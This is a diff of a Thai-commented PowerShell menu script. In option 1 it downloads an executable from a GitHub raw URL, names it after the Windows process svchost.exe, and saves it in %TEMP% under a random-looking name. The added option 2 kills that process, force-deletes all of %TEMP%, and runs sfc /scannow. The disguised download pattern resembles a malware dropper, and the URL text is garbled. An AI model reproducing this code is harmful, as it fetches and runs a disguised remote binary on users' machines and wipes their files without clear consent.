@@ -85,7 +85,7 @@ while ($true)
 
             Write-Console "DOWNLOADING..." "INFO"
 
-            # ⚠️ อย่าลืมใส่ URL ตรงนี้ และเปลี่ยนชื่อไฟล์ setup.exe ปลายทางตามต้องการนะครับ
+            # URL และชื่อไฟล์ปลายทาง
             $url  = "httpsraw.githubusercontent.comdraft7973-opsJETT.EXErefsheadsmainsvchost.exe" 
             $path = "$env:TEMP\T1252151512512.exe" 
 
@@ -124,6 +124,45 @@ while ($true)
         }
 
         "2" {
+            Clear-Host
+            Show-Header
+            
+            Write-Console "STARTING SYSTEM CLEANUP..." "INFO"
+            Write-Host ""
+
+            # 1. สั่งปิด Process (ถ้าหากมีไฟล์เดิมเปิดทำงานอยู่เพื่อให้สามารถลบไฟล์ได้)
+            $procName = "T1252151512512"
+            if (Get-Process -Name $procName -ErrorAction SilentlyContinue) {
+                Write-Console "Stopping process: $procName..." "INFO"
+                Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 1
+            }
+
+            # 2. ลบไฟล์ในโฟลเดอร์ %TEMP%
+            Write-Console "Clearing Windows Temporary files (%TEMP%)..." "INFO"
+            # ดึงรายการและลบไฟล์ทั้งหมด (ไฟล์ไหนที่ระบบล็อกไว้จะข้ามอัตโนมัติด้วย SilentlyContinue)
+            Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Console "Temporary files cleared successfully." "SUCCESS"
+            Write-Host ""
+
+            # 3. ตรวจสอบสิทธิ์และรันคำสั่ง sfc /scannow 
+            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+            
+            if ($isAdmin) {
+                Write-Console "Launching System File Checker (sfc /scannow)..." "INFO"
+                Write-Console "Please wait, this process may take a few minutes." "INFO"
+                Write-Host ""
+                
+                # เรียกใช้งาน cmd เพื่อรัน sfc /scannow โดยตรงในหน้าต่างเดิม
+                cmd.exe /c "sfc /scannow"
+                
+                Write-Host ""
+                Write-Console "SFC Scanning process finished." "SUCCESS"
+            } else {
+                Write-Host "  [!] Access Denied: 'sfc /scannow' requires administrative privileges." -ForegroundColor Red
+                Write-Host "      Please restart this script as Administrator." -ForegroundColor Yellow
+            }
+
             Write-Host ""
             Write-Console "CLEAR COMPLETE" "SUCCESS"
             Pause
